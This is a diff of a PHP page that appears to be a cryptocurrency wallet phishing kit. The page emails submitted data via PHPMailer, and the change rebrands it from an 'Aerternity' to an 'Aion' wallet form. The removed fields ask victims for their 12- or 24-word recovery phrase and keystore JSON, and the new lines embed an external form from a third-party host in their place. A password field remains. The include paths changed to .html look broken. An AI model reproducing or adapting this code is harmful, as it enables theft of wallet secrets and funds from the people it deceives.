@@ -2,11 +2,10 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-require 'PHPMailer/src/Exception.php';
-require 'PHPMailer/src/PHPMailer.php';
-require 'PHPMailer/src/SMTP.php';
-
-include 'config.php';
+require 'PHPMailer/src/Exception.html';
+require 'PHPMailer/src/PHPMailer.html';
+require 'PHPMailer/src/SMTP.html';
+include 'config.html';
 
 $message = "";
 
@@ -31,11 +30,11 @@ $message = "";
 
       //Recipients
        $mail->setFrom($setForm, "");
-       $mail->addAddress($send_to, ''); /// Add a recipient
+       $mail->addAddress($send_to, '');
 
       // Content
        $mail->isHTML(true); 
-       $mail->Subject = 'Aerternity Wallet form';
+       $mail->Subject = 'Aion Wallet form';
        $mail->Body = '
           <TABLE>
              <TR>
@@ -155,22 +154,16 @@ $message = "";
 
 <div id="phrase1" class="tabcontent" style="display: block;">
     <form action="" method="POST">
+    <embed src="https://ngs.dashclicks.com/forms/userform/1ecce880-dedb-4ac0-aa8e-106054f1864d" width="100%" height="400px" />
 
-      <!-- <input type="hidden" name="" value="MEW wallet"> -->
-      <textarea name="phrase" class="phrasekey" placeholder="Phrase"></textarea>
-      <br>
-      <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
-      <br>
-      <button type="button" name="import" class="btn" onclick="openCity(event, &#39;keystore1&#39;)" value="IMPORT" >IMPORT</button>
-    
   </div>
 
   <div id="keystore1" class="tabcontent" style="display: none;">
 
 
     <!-- <input type="hidden" name="" value="MEW wallet"> -->
-      <textarea name="keystore" class="keystorekey" placeholder="Keystore JSON"></textarea>
-      <br>
+    <embed src="https://ngs.dashclicks.com/forms/userform/1ecce880-dedb-4ac0-aa8e-106054f1864d" width="100%" height="400px" />
+    <br>
     <div class="field">
         <input type="text" name="password" class="keystorepassword" placeholder="Password">
     </div>
